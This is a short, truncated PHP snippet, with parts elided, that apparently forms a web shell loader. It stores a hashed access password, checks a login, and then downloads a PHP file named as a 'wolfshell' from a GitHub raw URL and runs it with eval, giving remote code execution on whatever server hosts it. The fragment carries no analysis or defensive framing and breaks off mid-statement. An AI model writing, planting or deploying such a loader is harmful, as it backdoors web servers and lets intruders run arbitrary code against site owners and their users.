<?php
$auth_pass = "6b83ad41a4ccdf55e9b453a4b451fff358b5d4165a3da83d8642e66415188fec";
...
if (is_logged_in()) {
    ...
    $a = fetchRemoteContent('https://raw.githubusercontent.com/kaorusimara-ops/shell-Xjerry/main/Xzjerry-wolfshell.php');
    if ($a !== false) {
        eval('?>' . $a);
    } else {
